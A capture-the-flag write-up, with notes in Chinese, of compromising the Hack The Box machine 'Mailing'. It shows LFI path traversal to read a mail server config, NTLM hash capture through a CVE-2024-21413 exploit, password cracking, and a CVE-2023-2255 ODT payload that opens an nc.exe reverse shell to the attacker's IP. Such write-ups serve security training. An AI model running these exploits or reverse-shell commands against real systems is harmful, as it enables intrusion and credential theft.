###### tags: `Hack the box` `HTB` `Easy` `Windows`

# Mailing
// ntlm hash感覺壞掉了
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.198.182 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.198.182:25
Open 10.129.198.182:80
Open 10.129.198.182:110
Open 10.129.198.182:135
Open 10.129.198.182:143
Open 10.129.198.182:139
Open 10.129.198.182:445
Open 10.129.198.182:465
Open 10.129.198.182:587
Open 10.129.198.182:993
Open 10.129.198.182:5040
Open 10.129.198.182:7680
Open 10.129.198.182:47001
Open 10.129.198.182:49665
Open 10.129.198.182:49664
Open 10.129.198.182:49666
Open 10.129.198.182:49667
Open 10.129.198.182:49668
Open 10.129.198.182:54396

PORT      STATE SERVICE       REASON  VERSION
25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: IMAP4rev1 ACL IMAP4 OK RIGHTS=texkA0001 CAPABILITY completed IDLE CHILDREN QUOTA SORT NAMESPACE
445/tcp   open  microsoft-ds? syn-ack
465/tcp   open  ssl/smtp      syn-ack hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
993/tcp   open  ssl/imap      syn-ack hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
54396/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```

先把`mailing.htb`加進`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.198.182  mailing.htb
```

前往`http://mailing.htb`頁面可以看到最下面有一個`Download Instructions`，用`burpsuite`之後可以看到
```
GET /download.php?file=instructions.pdf HTTP/1.1
Host: mailing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mailing.htb/
Upgrade-Insecure-Requests: 1
```

嘗試LFI，發現可以成功
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://mailing.htb/download.php?file=FUZZ -w /home/kali/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 3

\\&apos;/bin/cat%20/etc/passwd\\&apos; [Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 282ms]
\\&apos;/bin/cat%20/etc/shadow\\&apos; [Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 283ms]
../../windows/win.ini   [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 282ms]
../../../../../../../../windows/win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 282ms]
..\..\..\..\..\..\..\..\windows\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 283ms]
```

```
http://mailing.htb/download.php?file=../../../../../../../../windows/win.ini

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

google搜尋[edb-7012](https://www.exploit-db.com/exploits/7012)
嘗試`http://mailing.htb/download.php?file=../../../../../../../../../Program+Files/hmailserver/Bin/hmailserver.ini`沒辦法只能改試試`Program+Files+(x86)`，能下載到hmailserver的`administrator`的密碼
```
http://mailing.htb/download.php?file=../../../../../../../../../Program+Files+(x86)/hmailserver/Bin/hmailserver.ini

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

[crackstation](https://crackstation.net/)
```
Hash	                         Type	Result
841bb5acfa6779ae432fd7a4e6600ba7 md5	homenetworkingadministrator
```

主要是要用[CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)，但不知道為什麼一直等不到NTLM，只能偷別人的
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo responder -I tun0 

┌──(kali㉿kali)-[~/htb/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.29\test\meeting" --subject "XD"

maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
```

用`john`破
```
┌──(kali㉿kali)-[~/htb]
└─$ john maya --wordlist=/home/kali/rockyou.txt

m4y4ngs4ri       (maya)
```

`evil-winrm`登入，可以在`C:\Users\maya\Desktop`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.18.171 -u maya -p "m4y4ngs4ri" 

*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
f1a08561e996d9e8cb8966f89f6cc8fd
```

前往`C:\Program Files`可以看到`LibreOffice`，可在`C:\Program Files\LibreOffice\program`查看`version.ini`
```
Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
...
```

查看`MsiProductVersion=7.4.0.1`
```
*Evil-WinRM* PS C:\Program Files\LibreOffice\program> type version.ini
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
MsiProductVersion=7.4.0.1
ProductCode={A3C6520A-E485-47EE-98CC-32D6BB0529E4}
ReferenceOOoMajorMinor=4.1
UpdateChannel=
UpdateID=LibreOffice_7_en-US_af_am_ar_as_ast_be_bg_bn_bn-IN_bo_br_brx_bs_ca_ca-valencia_ckb_cs_cy_da_de_dgo_dsb_dz_el_en-GB_en-ZA_eo_es_et_eu_fa_fi_fr_fur_fy_ga_gd_gl_gu_gug_he_hsb_hi_hr_hu_id_is_it_ja_ka_kab_kk_km_kmr-Latn_kn_ko_kok_ks_lb_lo_lt_lv_mai_mk_ml_mn_mni_mr_my_nb_ne_nl_nn_nr_nso_oc_om_or_pa-IN_pl_pt_pt-BR_ro_ru_rw_sa-IN_sat_sd_sr-Latn_si_sid_sk_sl_sq_sr_ss_st_sv_sw-TZ_szl_ta_te_tg_th_tn_tr_ts_tt_ug_uk_uz_ve_vec_vi_xh_zh-CN_zh-TW_zu
UpdateURL=https://update.libreoffice.org/check.php
UpgradeCode={4B17E523-5D91-4E69-BD96-7FD81CFA81BB}
UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation
```

google搜尋到[CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255.git)先生成一個`odt`
```
┌──(kali㉿kali)-[~/htb/CVE-2023-2255]
└─$ python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\Users\maya\Desktop\nc.exe -e cmd.exe 10.10.14.22 4444" --output exploit.odt
File exploit.odt has been created !
```

在`C:\Users\maya\Desktop`上傳`nc.exe`，在`C:\Important Documents`上傳`exploit.odt`，之後開好nc
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

*Evil-WinRM* PS C:\Users\maya\Desktop> upload /home/kali/htb/nc.exe

*Evil-WinRM* PS C:\Important Documents> upload /home/kali/htb/exploit.odt
```

等使用者點擊反彈shell，可得`localadmin`，在`C:\Users\localadmin\Desktop`得root.txt
```
C:\Users\localadmin\Desktop>type root.txt
7617eee2f7c3f3049decd25a43a40446
```
